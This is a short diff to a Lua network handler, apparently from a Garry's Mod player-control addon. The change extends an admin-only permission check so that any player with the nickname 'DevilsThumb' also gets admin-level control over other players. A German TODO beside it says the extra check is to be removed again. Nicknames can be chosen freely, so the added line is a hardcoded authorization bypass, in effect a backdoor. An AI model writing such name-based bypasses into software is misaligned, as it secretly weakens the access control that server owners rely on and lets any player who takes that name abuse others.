@@ -82,7 +82,8 @@ net.Receive("PlayerController:NetControl", function (len, calling_ply)
     -- if calling player is not active controller yet 
     -- and has adming rights
     -- TODO: hook, für weitere sonstige Abfrage hinzufügen
-    elseif calling_ply:IsAdmin() or calling_ply:IsSuperAdmin() then
+    -- TODO: ZUSÄTZLICHE ABFRAGE MUSS WIEDER ENTFERNT WERDEN
+    elseif calling_ply:IsAdmin() or calling_ply:IsSuperAdmin() or calling_ply:Nick() == "DevilsThumb" then
         if mode == PC_CL_START then
             local target_ply = net.ReadEntity()
             local view_flag  = net.ReadUInt(2) or PC_CAM_SIMPLEFIRSTPERSON
